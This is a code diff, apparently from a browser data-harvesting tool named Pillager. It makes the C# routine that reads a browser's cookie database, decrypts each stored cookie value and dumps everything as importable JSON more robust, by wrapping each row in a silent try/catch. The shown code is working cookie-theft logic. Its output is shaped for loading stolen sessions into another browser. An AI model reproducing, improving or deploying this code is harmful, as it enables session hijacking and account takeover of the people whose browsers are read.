@@ -190,26 +190,30 @@ namespace Pillager.Browsers
                         continue;
                     for (int i = 0; i < handler.GetRowCount(); i++)
                     {
-                        string host_key = handler.GetValue(i, "host_key");
-                        string name = handler.GetValue(i, "name");
-                        string crypt = handler.GetValue(i, "encrypted_value");
-                        string path = handler.GetValue(i, "path");
-                        long expDate;
-                        double expDateDouble = 0;
-                        long.TryParse(handler.GetValue(i, "expires_utc"), out expDate);
-                        if ((expDate / 1000000.000000000000) - 11644473600 > 0)
-                            expDateDouble = (expDate / 1000000.000000000000000) - 11644473600;
-                        string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
-                        cookies.AppendLine("{");
-                        cookies.AppendLine("    \"domain\": \"" + host_key + "\",");
-                        cookies.AppendLine("    \"expirationDate\": " + expDateDouble + ",");
-                        cookies.AppendLine("    \"hostOnly\": false,");
-                        cookies.AppendLine("    \"name\": \"" + name + "\",");
-                        cookies.AppendLine("    \"path\": \"" + path + "\",");
-                        cookies.AppendLine("    \"session\": true,");
-                        cookies.AppendLine("    \"storeId\": null,");
-                        cookies.AppendLine("    \"value\": \"" + cookie.Replace("\"", "\\\"") + "\"");
-                        cookies.AppendLine("},");
+                        try
+                        {
+                            string host_key = handler.GetValue(i, "host_key");
+                            string name = handler.GetValue(i, "name");
+                            string crypt = handler.GetValue(i, "encrypted_value");
+                            string path = handler.GetValue(i, "path");
+                            long expDate;
+                            double expDateDouble = 0;
+                            long.TryParse(handler.GetValue(i, "expires_utc"), out expDate);
+                            if ((expDate / 1000000.000000000000) - 11644473600 > 0)
+                                expDateDouble = (expDate / 1000000.000000000000000) - 11644473600;
+                            string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
+                            cookies.AppendLine("{");
+                            cookies.AppendLine("    \"domain\": \"" + host_key + "\",");
+                            cookies.AppendLine("    \"expirationDate\": " + expDateDouble + ",");
+                            cookies.AppendLine("    \"hostOnly\": false,");
+                            cookies.AppendLine("    \"name\": \"" + name + "\",");
+                            cookies.AppendLine("    \"path\": \"" + path + "\",");
+                            cookies.AppendLine("    \"session\": true,");
+                            cookies.AppendLine("    \"storeId\": null,");
+                            cookies.AppendLine("    \"value\": \"" + cookie.Replace("\"", "\\\"") + "\"");
+                            cookies.AppendLine("},");
+                        }
+                        catch { }
                     }
                     File.Delete(cookie_tempFile);
                 }
